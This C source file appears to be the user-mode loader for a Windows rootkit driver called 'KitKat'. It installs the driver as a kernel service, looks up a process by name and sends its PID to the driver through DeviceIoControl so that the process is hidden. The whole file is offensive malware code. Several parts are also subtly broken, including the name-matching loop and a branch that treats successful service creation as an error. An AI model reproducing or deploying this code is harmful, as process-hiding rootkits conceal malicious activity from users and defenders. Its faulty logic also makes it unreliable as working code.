#include "main.h"

#define IRP_CMD_CODE 0x815
#define SERVICE "KitKat"
#define DEVICE "\\\\.\\KitKat"
#define DRIVER "c:\\\\Users\\User\\Desktop\\TillItWorksAmk\\HideProcDriver\\x64\\Release\\HideProcDriver.sys"

unsigned int GetProcessList(char* processname)
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	unsigned int result;
	int match = 0;
	result = 0;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		//printError(TEXT("CreateToolhelp32Snapshot (of processes)"));
		return(FALSE);
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return(FALSE);
	}

	do {
		if (strlen(pe32.szExeFile) == strlen(processname))
		{
			for (int i = 0; i < sizeof(processname); i++)
			{
				if (strcmp(&processname[i], &pe32.szExeFile[i]) == 0)
				{
					match += 1;
					continue;
				}
				else
				{
					match = 0;
					break;
				}
			}
		}
		if (match == sizeof(processname))
		{
			result = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return(result);
}

int call_kernel_driver(unsigned int pid, HANDLE hDevice)
{
	_tprintf("[*] Calling driver, hiding PID [%ui]\n", pid);

	ULONG bytes_returned;
	char* retbuf[1024];

	BOOLEAN call_result = DeviceIoControl
	(
		hDevice,
		IRP_CMD_CODE,
		&pid,
		strlen((const char*)&pid) + 1,
		retbuf,
		200,
		&bytes_returned,
		(LPOVERLAPPED)NULL
	);
	if (!call_result)
	{
		_tprintf("[-] Error sending IRP to driver [%s]\n", GetLastErrorAsString());
		return 0;
	}

	_tprintf("[+] IRP sent, check your process!\n");
	_tprintf("KitKat returned [%s]\n", retbuf);
}

BOOL load_driver(SC_HANDLE svcHandle)
{
	_tprintf("[*] Loading driver! (cross your fingers)\n");

	if (StartService(svcHandle, 0, NULL) == 0)
	{
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
		{
			_tprintf("!!! Driver already running (st00pid)\n");
			return TRUE;
		}
		else
		{
			_tprintf("[-] Error on attempt to load driver!\n");
			return FALSE;
		}
	}

	_tprintf("[+] Driver loaded\n");
	return TRUE;
}

HANDLE install_driver()
{
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE hService = NULL;
	HANDLE hDevice = NULL;
	BOOLEAN b;
	ULONG r;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		_tprintf("[-] Opening SCManager Database failed: [%s]", GetLastErrorAsString());
		goto clean;
	}

	_tprintf("[*] Grabbing driver device handle...\n");

	hService = OpenService(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS);
	if (hService == NULL)
	{
		_tprintf("!!! Service doesn't exist, installing new SCM entry...\n");

		if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
		{
			hService = CreateService
			(
				hSCManager,
				TEXT(SERVICE),
				TEXT(SERVICE),
				SC_MANAGER_ALL_ACCESS,
				SERVICE_KERNEL_DRIVER,
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				TEXT(DRIVER),
				NULL, NULL, NULL, NULL, NULL
			);
			if (hService == NULL)
			{
				_tprintf("[-] Error creating service [%s]\n", GetLastErrorAsString());
				goto clean;
			}
			else
			{
				_tprintf("[-] Error opening service [%s]\n", GetLastErrorAsString());
				goto clean;
			}

			_tprintf("[+] SCM Database entry added!\n");
			if (!load_driver(hService)) { goto clean; }
		}
	}

	hDevice = CreateFile
	(
		TEXT(DEVICE),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		if (!load_driver(hService))
		{
			_tprintf("[-] Error creating handle [%s]\n", GetLastErrorAsString());
			hDevice = NULL;
			goto clean;
		}
	}

clean:
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	if (hDevice) { return hDevice; }
	return NULL;
}
